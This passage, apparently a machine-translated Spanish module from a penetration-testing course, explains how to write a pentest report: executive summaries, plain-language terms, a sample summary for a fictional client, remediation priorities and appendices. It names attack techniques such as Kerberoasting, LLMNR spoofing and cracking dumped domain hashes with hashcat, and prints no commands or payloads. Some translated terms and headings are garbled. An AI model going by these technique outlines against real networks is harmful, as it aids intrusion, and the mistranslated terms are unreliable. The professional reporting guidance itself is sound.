- `Describe the types of things you managed to access`- Es posible que su audiencia no tenga idea de lo que significa "administrador de dominio", pero si menciona que obtuvo acceso a una cuenta que le permitió obtener documentos de recursos humanos, sistemas bancarios y otros activos críticos, eso es universalmente comprensible.
    
- `Describe the general things that need to improve to mitigate the risks you discovered.`- Esto no debería ser "instalar 3 parches y llamarme en un año". Debería pensar en términos de "¿qué proceso se rompió lo que permitió que una vulnerabilidad de cinco años no se apunte en una cuarta parte del medio ambiente?". Si está rociado con contraseña y obtiene 500 hits en Welcome1!, Cambiar las contraseñas de esas 500 cuentas es solo parte de la solución. La otra parte es probablemente proporcionar a la mesa de ayuda una forma de establecer contraseñas iniciales más fuertes de manera eficiente.
    
- `If you're feeling brave and have a decent amount of experience on both sides, provide a general expectation for how much effort will be necessary to fix some of this.`- Si tiene mucho pasado como un sistema de sistemas o ingeniero y sabe cuánta política interna puede tener que pasar para comenzar a manipular las políticas grupales, es posible que desee intentar establecer una expectativa de niveles bajos, moderados y significativos de tiempo y esfuerzo para corregir los problemas, por lo que un CEO excesivamente no le dice a su equipo de servidor que necesitan aplicar las plantillas de CIS endureciendo a sus GPO durante el fin de semana sin probar los problemas.
    

#### No

- `Name or recommend specific vendors.`- El entregable es un documento técnico, no un documento de ventas. Es aceptable sugerir tecnologías como EDR o agregación log, pero mantente alejado de recomendar a los proveedores específicos de esas tecnologías, como CrowdStrike y Splunk. Si tiene experiencia con un proveedor en particular que es reciente y se siente cómodo dándole comentarios al cliente, hágalo fuera de banda y asegúrese de que tenga claro que debe tomar su propia decisión (y probablemente llevar al ejecutivo de cuentas del cliente a esa discusión). Si está describiendo vulnerabilidades específicas, es más probable que su lector reconozca algo como "proveedores como VMware, Apache y Adobe" en lugar de "VSphere, Tomcat y Acrobat".
    
- `Use Acronyms.`- La IP y la VPN han alcanzado un nivel de ubicuidad de que tal vez estén bien, pero usar acrónimos para protocolos y tipos de ataques (por ejemplo, SNMP, MITM) es sordo y hará que su resumen ejecutivo sea completamente ineficaz para su audiencia prevista.
    
- `Spend more time talking about stuff that doesn't matter than you do about the significant findings in the report.`- Está dentro de su poder dirigir la atención. No lo desperdicie en los problemas que descubrió que no fueron tan impactantes.
    
- `Use words that no one has ever heard of before.`- Tener un vocabulario grande es excelente, pero si nadie puede entender el punto que estás tratando de hacer o tienen que buscar qué palabras significan, todo lo que son es una distracción. Muestre eso en otro lugar.
    
- `Reference a more technical section of the report.`- La razón por la que el ejecutivo está leyendo esto podría ser porque no entienden los detalles técnicos, o pueden decidir que simplemente no tienen tiempo para ello. Además, a nadie le gusta tener que desplazarse de un lado a otro durante todo el informe para descubrir qué está pasando.
    

#### Cambios de vocabulario

Para proporcionar algunos ejemplos de lo que significa "escribir a una audiencia no técnica", hemos proporcionado algunos ejemplos a continuación de los términos técnicos y acrónimos que puede tener la tentación de usar, junto con una alternativa menos técnica que podría usarse. Esta lista no es exhaustiva ni la forma "correcta" de describir estas cosas. Se entienden como ejemplos de cómo podría describir un tema técnico de una manera más universalmente comprensible.

- `VPN, SSH`- Un protocolo utilizado para una administración remota segura
- `SSL/TLS`- Tecnología utilizada para facilitar la navegación web segura
- `Hash`- La salida de un algoritmo comúnmente utilizado para validar la integridad de los archivos
- `Password Spraying`- Un ataque en el que se intenta una contraseña única y fácilmente adivinable para una gran lista de cuentas de usuario cosechadas
- `Password Cracking`- Un ataque con contraseña fuera de línea en el que la forma criptográfica de la contraseña de un usuario se convierte en su forma legible por humanos
- `Buffer overflow/deserialization/etc.`- Un ataque que resultó en la ejecución de comando remoto en el host de destino
- `OSINT`- Recopilación de inteligencia de código abierto o caza/uso de datos sobre una empresa y sus empleados que se pueden encontrar utilizando motores de búsqueda y otras fuentes públicas sin interactuar con la red externa de una empresa
- `SQL injection/XSS`- Una vulnerabilidad en la que se acepta la entrada del usuario sin desinfectar caracteres destinados a manipular la lógica de la aplicación de manera no deseada

Estos son solo algunos ejemplos. Su glosario crecerá con el tiempo a medida que escriba más informes. También puede mejorar esto en esta área leyendo los resúmenes ejecutivos que otros han escrito describiendo algunos de los mismos hallazgos que típicamente descubre. Hacerlo puede ser el catalizador para pensar en algo de una manera diferente. También puede recibir comentarios del cliente de vez en cuando sobre esto, y es importante recibir estos comentarios con gracia y con una mente abierta. Es posible que tenga la tentación de ponerse a la defensiva (especialmente si el cliente está realmente agresivo), pero al final del día, le pagaron para construirles un producto útil. Si no es porque no pueden entenderlo, míralo como una oportunidad para practicar y crecer. Tomar comentarios de los clientes como un ataque personal puede ser difícil de no hacer, pero es una de las cosas más valiosas que pueden darle.

---

## Ejemplo de resumen ejecutivo

A continuación se muestra un resumen ejecutivo de muestra que se tomó del informe de muestra incluido con este módulo:

Durante la prueba de penetración interna contra InLaneFreight, hackear la Academia de la caja identificó siete (7) hallazgos que amenazan la confidencialidad, la integridad y la disponibilidad de los sistemas de información de InLaneFreight. Los hallazgos se clasificaron por nivel de gravedad, con cinco (5) de los hallazgos que se asignaron una calificación de alto riesgo, un (1) medio de riesgo y uno (1) bajo riesgo. También hubo un (1) hallazgo informativo relacionado con la mejora de las capacidades de monitoreo de seguridad dentro de la red interna.

El probador encontró que el parche y la gestión de vulnerabilidad de InLaneFreight estaban bien mantenidos. Ninguno de los hallazgos en este informe estaba relacionado con el sistema operativo faltante o parches de terceros de vulnerabilidades conocidas en servicios y aplicaciones que podrían dar como resultado un acceso no autorizado y un compromiso del sistema. Cada defecto descubierto durante las pruebas estaba relacionado con una configuración errónea o la falta de endurecimiento, y la mayoría caía bajo las categorías de autenticación débil y autorización débil.

Un hallazgo involucró un protocolo de comunicación de red que puede ser "falsificado" para recuperar contraseñas para usuarios internos que pueden usarse para obtener acceso no autorizado si un atacante puede obtener acceso no autorizado a la red sin credenciales. En la mayoría de los entornos corporativos, este protocolo es innecesario y se puede deshabilitar. Está habilitado de forma predeterminada principalmente para pequeñas y medianas empresas que no tienen los recursos para un servidor de resolución de nombre de host dedicado (la "libreta telefónica" de su red). Durante la evaluación, estos recursos se observaron en la red, por lo que la infreación debería comenzar a formular un plan de prueba para deshabilitar el servicio peligroso.

El siguiente problema fue una configuración débil que involucra cuentas de servicio que permite a cualquier usuario autenticado robar un componente del proceso de autenticación que a menudo se puede adivinar fuera de línea (a través de la contraseña "agrietamiento") revele la forma legible por humanos de la contraseña de la cuenta. Estos tipos de cuentas de servicio generalmente tienen más privilegios que un usuario estándar, por lo que obtener una de sus contraseñas en texto claro podría dar lugar a un movimiento lateral o una escalada de privilegios y, finalmente, en un compromiso completo de la red interna. El probador también notó que se usó la misma contraseña para el acceso al administrador a todos los servidores dentro de la red interna. Esto significa que si un servidor está comprometido, un atacante puede reutilizar esta contraseña para acceder a cualquier servidor que lo comparta para el acceso administrativo. Afortunadamente, ambos problemas pueden corregirse sin la necesidad de herramientas de terceros. Active Directory de Microsoft contiene configuraciones que pueden usarse para minimizar el riesgo de que estos recursos sean abusados ​​en beneficio de los usuarios maliciosos.

También se descubrió que un servidor web ejecutaba una aplicación web que usaba credenciales débiles y fácilmente adivinables para acceder a una consola administrativa que se puede aprovechar para obtener acceso no autorizado al servidor subyacente. Esto podría ser explotado por un atacante en la red interna sin necesidad de una cuenta de usuario válida. Este ataque está muy bien documentado, por lo que es un objetivo extremadamente probable que puede ser particularmente dañino, incluso en manos de un atacante no calificado. Idealmente, el acceso externo directo a este servicio estaría deshabilitado, pero en el caso de que no pueda ser, debe reconfigurarse con credenciales excepcionalmente fuertes que se giran con frecuencia. InLaneFreight también puede considerar maximizar los datos de registro recopilados de este dispositivo para garantizar que los ataques contra él puedan ser detectados y triadas rápidamente.

El probador también encontró carpetas compartidas con permisos excesivos, lo que significa que todos los usuarios de la red interna pueden acceder a una cantidad considerable de datos. Si bien compartir archivos internamente entre departamentos y usuarios es importante para las operaciones comerciales del día a día, los permisos abiertos en las acciones del archivo pueden dar lugar a una divulgación involuntaria de información confidencial. Incluso si un archivo compartido no contiene ninguna información confidencial hoy, alguien puede poner tales datos allí, pensando que está protegido cuando no lo está. Esta configuración debe cambiarse para garantizar que los usuarios puedan acceder solo a lo que es necesario para realizar sus tareas diarias.

Finalmente, el probador notó que las actividades de prueba parecían pasar en su mayoría desapercibidas, lo que puede representar una oportunidad para mejorar la visibilidad en la red interna e indica que un atacante del mundo real podría permanecer sin detectar si se logra el acceso interno. InLaneFreight debe crear un plan de remediación basado en la sección Resumen de remediación de este informe, abordando todos los altos hallazgos lo antes posible de acuerdo con las necesidades del negocio. InLaneFreight también debe considerar realizar evaluaciones periódicas de vulnerabilidad si aún no se están realizando. Una vez que se han abordado los problemas identificados en este informe, una evaluación de seguridad de Active Directory de Active Directory más colaborativa puede ayudar a identificar oportunidades adicionales para endurecer el entorno de Active Directory, lo que dificulta que los atacantes se muevan alrededor de la red y aumenten la probabilidad de que In LaneTright pueda detectar y responder a una actividad sospechosa.

#### Anatomía del resumen ejecutivo

Ese muro de texto es genial y todo, pero ¿cómo llegamos allí? Echemos un vistazo al proceso de pensamiento, ¿de acuerdo? Para este análisis, utilizaremos el informe de muestra que puede descargar desde el`Resources`lista.

Lo primero que probablemente desee hacer es obtener una lista de sus hallazgos juntos e intentar clasificar la naturaleza del riesgo de cada uno. Estas categorías serán la base de lo que va a discutir en el resumen ejecutivo. En nuestro informe de muestra, tenemos los siguientes hallazgos:

- LLMNR/NBT -NS Respuesta Spouring -`configuration change/system hardening`
- Autenticación débil de Kerberos ("Kerberoasting") -`configuration change/system hardening`
- Reutilización de contraseña de administrador local -`behavioral/system hardening`
- Contraseñas débiles de Active Directory -`behavioral`
- Tomcat gerente credenciales débiles/predeterminadas altas -`configuration change/system hardening`
- Acciones de archivo inseguro -`configuration change/system hardening/permissions`
- Listado de directorio habilitado -`configuration change/system hardening`
- Mejorar las capacidades de monitoreo de seguridad -`configuration change/system hardening`

Primero, es notable que no haya problemas en esta lista vinculados a los parches faltantes, lo que indica que el cliente puede haber gastado un tiempo y un esfuerzo considerables madurando ese proceso. Para cualquiera que haya sido un sistema de sistemas antes, sabrá que esta no es una hazaña pequeña, por lo que queremos asegurarnos de reconocer sus esfuerzos. Esto lo atrae al equipo de Sysadmin al mostrar a sus ejecutivos que el trabajo que han estado haciendo ha sido efectivo, y alienta a los ejecutivos a continuar invirtiendo en personas y tecnología que pueden ayudar a corregir algunos de sus problemas.

Volviendo a nuestros hallazgos, puede ver que casi todos los hallazgos tienen algún tipo de cambio de configuración o resolución de endurecimiento del sistema. Para colapsarlo aún más, podría comenzar a concluir que este cliente en particular tiene un proceso de gestión de configuración inmadura (es decir, no hacen un muy buen trabajo al cambiar las configuraciones predeterminadas en nada antes de colocarlo en producción). Dado que hay mucho que desempacar en ocho hallazgos, probablemente no desee escribir un párrafo que diga "Configure las cosas mejor". Tiene algunos bienes inmuebles para entrar en algunos problemas individuales y describir parte del impacto (las cosas que llaman la atención) de algunos de los hallazgos más dañinos. El desarrollo de un proceso de gestión de configuración requerirá mucho trabajo, por lo que es importante describir qué hizo o podría suceder si este problema no se controla.

A medida que lea cada párrafo, probablemente podrá asignar la descripción de alto nivel a la búsqueda asociada para darle una idea de cómo describir algunos de los términos más técnicos de una manera que una audiencia no técnica puede seguir sin tener que buscar las cosas. Notará que no usamos acrónimos, hablamos sobre protocolos, mencionamos boletos que otorgan otros boletos, ni nada de eso. En algunos casos, también describimos anécdotas generales sobre qué nivel de esfuerzo esperar de la remediación, cambios que deben realizarse con cautela, soluciones para monitorear una amenaza determinada y el nivel de habilidad requerido para realizar una explotación. No tiene que tener un párrafo para cada hallazgo. Si tiene un informe con 20 hallazgos, eso se saldría de control rápidamente. Trate de concentrarse en los más impactantes.

Un par de matices de mencionar también:

- Ciertas observaciones que realiza durante la evaluación puede indicar un problema más significativo que el cliente puede no ser consciente. Obviamente, es valioso proporcionar este análisis, pero debe tener cuidado de cómo está redactado asegurarse de que no está hablando en absoluto debido a una suposición.
- Al final, notarás un párrafo sobre cómo**parece que**y**indicó que**El cliente no detectó nuestra actividad de prueba. Estos clasificatorios son importantes porque no estás absolutamente seguro de que no lo hicieron. Es posible que no te hayan dicho que lo hicieron.
- Otro ejemplo de esto (en general, no en este resumen ejecutivo) sería si escribiera algo en el sentido de "comenzar a documentar las plantillas y procesos de endurecimiento del sistema". Esto insinúa que no han hecho nada, lo que podría ser insultante si realmente lo intentaran y fallaban. En su lugar, podría decir: "Revise los procesos de administración de configuración y aborde las brechas que condujeron a los problemas identificados en este informe".

Con suerte, esto ayuda a aclarar algunos de los procesos de pensamiento que se dedicaron a escribir esto y le da algunas ideas sobre cómo pensar en las cosas de manera diferente cuando se trata de describirlas. Las palabras tienen significado, así que asegúrese de elegirlas cuidadosamente.

---

## Resumen de recomendaciones

Antes de entrar en los hallazgos técnicos, es una buena idea proporcionar un`Summary of Recommendations`o`Remediation Summary`sección. Aquí podemos enumerar nuestras recomendaciones a corto, mediano y largo plazo basados ​​en nuestros hallazgos y el estado actual del entorno del cliente. Tendremos que utilizar nuestra experiencia y conocimiento del negocio del cliente, el presupuesto de seguridad, las consideraciones de personal, etc., para hacer recomendaciones precisas. Nuestros clientes a menudo tendrán información sobre esta sección, por lo que queremos hacerlo bien o las recomendaciones son inútiles. Si estructuramos esto correctamente, nuestros clientes pueden usarlo como base para una hoja de ruta de remediación. Si opta por no hacer esto, prepárese para que los clientes le pidan que priorice la remediación para ellos. Puede que no suceda todo el tiempo, pero si tiene un informe con 15 hallazgos de alto riesgo y nada más, es probable que quieran saber cuál de ellos es "el Altísimo". Como dice el dicho, "Cuando todo es importante, nada es importante".

Debemos vincular cada recomendación a un hallazgo específico y no incluir recomendaciones a corto o mediano plazo que no sean procesables al remediar los hallazgos reportados más adelante en el informe. Las recomendaciones a largo plazo pueden volver a las recomendaciones informativas/de mejores prácticas como`"Create baseline security templates for Windows Server and Workstation hosts"`pero también puede ser recomendaciones de consumo como`"Perform periodic Social Engineering engagements with follow-on debriefings and security awareness training to build a security-focused culture within the organization from the top down."`

Algunos hallazgos podrían tener una recomendación asociada a corto y largo plazo. Por ejemplo, si falta un parche en particular en muchos lugares, es una señal de que la organización lucha con la gestión de parches y quizás no tiene un programa de gestión de parches sólido, junto con políticas y procedimientos asociados. La solución a corto plazo sería expulsar los parches relevantes, mientras que el objetivo a largo plazo sería revisar los procesos de gestión de parches y vulnerabilidad para abordar cualquier brecha que evite que el mismo problema recurra nuevamente. En el mundo de la seguridad de la aplicación, podría estar arreglando el código a corto plazo y a largo plazo, revisando el SDLC para garantizar que la seguridad se considere lo suficientemente temprano en el proceso de desarrollo para evitar que estos problemas lleguen a la producción.

---

## Recomendaciones

Después del resumen ejecutivo, el`Findings`La sección es una de las más importantes. Esta sección nos da la oportunidad de mostrar nuestro trabajo, pintar al cliente una imagen del riesgo para su entorno, dar a los equipos técnicos la evidencia para validar y reproducir problemas y proporcionar asesoramiento de remediación. Discutiremos esta sección del informe en detalle en la siguiente sección de este módulo:[Cómo escribir un hallazgo](https://academy.hackthebox.com/module/162/section/1536).

---

## Apéndices

Hay apéndices que deberían aparecer en cada informe, pero otros serán dinámicos y pueden no ser necesarios para todos los informes. Si alguno de estos apéndices hincha el tamaño del informe innecesariamente, es posible que desee considerar si una hoja de cálculo suplementaria sería una mejor manera de presentar los datos (sin mencionar la capacidad mejorada de clasificar y filtrar).

---

## Apéndices estáticos

#### Alcance

Muestra el alcance de la evaluación (URL, rangos de red, instalaciones, etc.). La mayoría de los auditores a los que el cliente debe entregar su informe necesitará ver esto.

#### Metodología

Explique el proceso repetible que sigue para garantizar que sus evaluaciones sean exhaustivas y consistentes.

#### Clasificaciones de gravedad

Si sus clasificaciones de gravedad no se asignan directamente a una puntuación CVSS o algo similar, deberá articular los criterios necesarios para cumplir con sus definiciones de gravedad. Tendrá que defender esto ocasionalmente, así que asegúrese de que sea sólido y pueda estar respaldado con la lógica y que los hallazgos que incluya en su informe se califican en consecuencia.

#### Biografías

Si realiza evaluaciones con la intención de cumplir específicamente el cumplimiento de PCI, el informe debe incluir una biografía sobre el personal que realiza la evaluación con el objetivo específico de articular que el consultor está adecuadamente calificado para realizar la evaluación. Incluso sin obligaciones de cumplimiento, puede ayudar a dar tranquilidad al cliente que la persona que realiza su evaluación sabía lo que estaba haciendo.

---

## Apéndices dinámicos

#### Intentos de explotación y cargas útiles

Si alguna vez ha hecho algo en la respuesta a incidentes, debe saber cuántos artefactos quedan después de una prueba de penetración para que los hombres forenses intenten tamizar. Sea respetuoso y realice un seguimiento de las cosas que hizo para que si experimentan un incidente, puedan diferenciar lo que fue usted frente a un atacante real. Si genera cargas útiles personalizadas, particularmente si las deja caer en el disco, también debe incluir los detalles de esas cargas útiles aquí, por lo que el cliente sabe exactamente a dónde ir y qué buscar para deshacerse de ellas. Esto es especialmente importante para las cargas útiles que no puede limpiar usted mismo.

#### Credenciales comprometidas

Si una gran cantidad de cuentas se vieron comprometidas, es útil enumerarlas aquí (si compromete todo el dominio, podría ser un esfuerzo desperdiciado para enumerar cada cuenta de usuario en lugar de solo decir "todas las cuentas de dominio") para que el cliente pueda tomar medidas contra ellos si es necesario.

#### Cambios de configuración

Si realizó algún cambio de configuración en el entorno del cliente (con suerte, lo solicitó primero), debe detallarlos todos para que el cliente pueda revertirlos y eliminar cualquier riesgo que haya introducido en el entorno (como deshabilitar EDR o algo así). Obviamente, es ideal si vuelve a colocar las cosas de la forma en que las encontró y obtiene la aprobación de la escritura del cliente para cambiar las cosas para evitar que se griten más adelante si su cambio tiene consecuencias involuntarias para un proceso de generación de ingresos.

#### Alcance afectado adicional

Si tiene un hallazgo con una lista de hosts afectados que serían demasiado para incluir con la búsqueda misma, generalmente puede hacer referencia a un apéndice en el hallazgo para ver una lista completa de los hosts afectados donde puede crear una tabla para mostrarlos en varias columnas. Esto ayuda a mantener limpio el informe en lugar de tener una lista con viñetas de varias páginas.

#### Recopilación de información

Si la evaluación es una prueba de penetración externa, podemos incluir datos adicionales para ayudar al cliente a comprender su huella externa. Esto podría incluir datos de Whois, información de propiedad de dominio, subdominios, correos electrónicos descubiertos, cuentas que se encuentran en los datos de violación pública ([Desaliñado](https://www.dehashed.com/)es excelente para esto), un análisis de las configuraciones SSL/TLS del cliente, e incluso una lista de puertos/servicios accesibles externamente (en un gran alcance externo, es probable que desee hacer una hoja de cálculo complementaria). Estos datos pueden ser beneficiosos en un informe de bajo a no encontrar, pero deberían transmitir algún tipo de valor al cliente y no solo ser "pelusa".

#### Análisis de contraseña de dominio

Si puede obtener acceso de administrador de dominio y descargar la base de datos NTDS, es una buena idea ejecutar esto a través de hashcat con múltiples listas y reglas de palabras e incluso la fuerza bruta NTLM a través de ocho caracteres si su plataforma de agrietamiento de contraseña es lo suficientemente potente. Una vez que haya agotado sus intentos de agrietamiento, una herramienta como[Dpat](https://github.com/clr2of8/DPAT)Se puede utilizar para producir un buen informe con varias estadísticas. Es posible que desee incluir algunas estadísticas clave de este informe (es decir, el número de hashes obtenidos, el número y el porcentaje agrietados, el número de grietas de cuentas privilegiadas (piense en administradores de dominio y administradores empresariales), contraseñas X principales y el número de contraseñas desciftas para cada longitud de carácter). Esto puede ayudar a conducir temas de origen en el resumen ejecutivo y las secciones de hallazgos con respecto a las contraseñas débiles. También puede proporcionar al cliente todo el informe DPAT como datos complementarios.

---

## Diferencias de tipo de informe

En este módulo, estamos cubriendo principalmente todos los elementos que deben incluirse en un informe de prueba de penetración interna o una prueba de penetración externa que terminó con un compromiso interno. Algunos de los elementos del informe (como la cadena de ataque) probablemente no se aplicarán en un informe de prueba de penetración externa donde no hubo compromiso interno. Este tipo de informe se centraría más en la recopilación de información, los datos de OSINT y los servicios expuestos externamente. Probablemente no incluiría apéndices como credenciales comprometidas, cambios de configuración o un análisis de contraseña de dominio. Un informe de Evaluación de Seguridad de la Aplicación Web (WASA) probablemente se centraría principalmente en las secciones de resumen ejecutivo y hallazgos y probablemente enfatizaría el Top 10 de OWASP. Una evaluación de seguridad física, una evaluación del equipo rojo o la participación de la ingeniería social se escribirían en un formato narrativo más de. Es una buena práctica crear plantillas para varios tipos de evaluaciones, por lo que las tiene listas para comenzar cuando surge ese tipo particular de evaluación.

Ahora que hemos cubierto los elementos de un informe, digamos cómo escribir un hallazgo de manera efectiva.